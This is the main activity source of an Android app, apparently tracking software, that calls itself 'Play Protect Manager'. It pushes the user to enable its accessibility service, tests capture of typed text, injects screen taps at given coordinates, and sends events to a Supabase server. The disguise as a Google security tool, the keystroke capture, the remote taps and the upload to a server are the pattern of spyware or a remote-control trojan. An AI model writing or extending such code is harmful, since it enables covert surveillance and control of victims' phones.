package com.andtracker;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import java.util.List;

public class MainActivity extends Activity {
    private TextView statusTextView;
    private EditText tapXInput;
    private EditText tapYInput;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Interface minimale
        setContentView(createSimpleLayout());
        
        // Vérifier si le service d'accessibilité est activé
        checkAccessibilityService();
    }
    
    private android.view.View createSimpleLayout() {
        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.setPadding(40, 40, 40, 40);
        layout.setGravity(android.view.Gravity.CENTER);
        
        TextView title = new TextView(this);
        title.setText("Play Protect Manager");
        title.setTextSize(24);
        title.setGravity(android.view.Gravity.CENTER);
        title.setPadding(0, 0, 0, 20);
        layout.addView(title);
        
        statusTextView = new TextView(this);
        statusTextView.setTextSize(16);
        statusTextView.setGravity(android.view.Gravity.CENTER);
        statusTextView.setPadding(0, 0, 0, 30);
        layout.addView(statusTextView);

        // Champ de test pour générer des events TYPE_VIEW_TEXT_CHANGED
        EditText testInput = new EditText(this);
        testInput.setHint("Tape ici pour tester la capture");
        testInput.setMinLines(2);
        testInput.setGravity(android.view.Gravity.CENTER);
        layout.addView(testInput);

        // --- Tap X/Y (via AccessibilityService.dispatchGesture) ---
        TextView tapTitle = new TextView(this);
        tapTitle.setText("Tap (x/y en pixels écran)");
        tapTitle.setTextSize(16);
        tapTitle.setPadding(0, 30, 0, 10);
        tapTitle.setGravity(android.view.Gravity.CENTER);
        layout.addView(tapTitle);

        tapXInput = new EditText(this);
        tapXInput.setHint("x (px)");
        tapXInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
        layout.addView(tapXInput);

        tapYInput = new EditText(this);
        tapYInput.setHint("y (px)");
        tapYInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
        layout.addView(tapYInput);

        Button tapButton = new Button(this);
        tapButton.setText("Taper (tap)");
        tapButton.setOnClickListener(v -> doTapFromInputs());
        layout.addView(tapButton);

        Button testButton = new Button(this);
        testButton.setText("Envoyer un test à Supabase");
        testButton.setOnClickListener(v -> sendTestToSupabase());
        layout.addView(testButton);
        
        Button settingsButton = new Button(this);
        settingsButton.setText("Ouvrir les paramètres d'accessibilité");
        settingsButton.setOnClickListener(v -> openAccessibilitySettings());
        layout.addView(settingsButton);
        
        return layout;
    }

    private void doTapFromInputs() {
        ProtectManagerService svc = ProtectManagerService.getInstance();
        if (svc == null) {
            Toast.makeText(this, "Service d'accessibilité non connecté (active-le dans les paramètres).", Toast.LENGTH_LONG).show();
            return;
        }

        try {
            String xs = (tapXInput == null) ? "" : String.valueOf(tapXInput.getText()).trim();
            String ys = (tapYInput == null) ? "" : String.valueOf(tapYInput.getText()).trim();
            if (xs.isEmpty() || ys.isEmpty()) {
                Toast.makeText(this, "Renseigne x et y (pixels).", Toast.LENGTH_SHORT).show();
                return;
            }

            int x = Integer.parseInt(xs);
            int y = Integer.parseInt(ys);
            boolean ok = svc.tap(x, y);
            Toast.makeText(this, ok ? "Tap envoyé." : "Échec tap (dispatchGesture).", Toast.LENGTH_SHORT).show();
        } catch (NumberFormatException e) {
            Toast.makeText(this, "Valeurs invalides: x/y doivent être des entiers.", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendTestToSupabase() {
        Toast.makeText(this, "Envoi test à Supabase...", Toast.LENGTH_SHORT).show();
        SupabaseAndroidEventsClient.sendEvent(
                this,
                getPackageName(),
                "test",
                "TEST"
        );
    }
    
    private void checkAccessibilityService() {
        AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
        List<android.accessibilityservice.AccessibilityServiceInfo> enabledServices = 
            am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
        
        boolean isServiceEnabled = false;
        String serviceName = getPackageName() + "/" + ProtectManagerService.class.getName();
        
        for (android.accessibilityservice.AccessibilityServiceInfo service : enabledServices) {
            String enabledService = service.getResolveInfo().serviceInfo.packageName + "/" + 
                                   service.getResolveInfo().serviceInfo.name;
            if (serviceName.equals(enabledService)) {
                isServiceEnabled = true;
                break;
            }
        }
        
        if (statusTextView != null) {
            if (isServiceEnabled) {
                statusTextView.setText("Service activé ✓");
                statusTextView.setTextColor(0xFF4CAF50);
            } else {
                statusTextView.setText("Service non activé. Veuillez l'activer dans les paramètres.");
                statusTextView.setTextColor(0xFFF44336);
            }
        }
        
        if (!isServiceEnabled) {
            Toast.makeText(this, "Veuillez activer le service d'accessibilité", Toast.LENGTH_LONG).show();
        }
    }
    
    private void openAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        // Vérifier à nouveau quand l'utilisateur revient des paramètres
        checkAccessibilityService();
    }
}
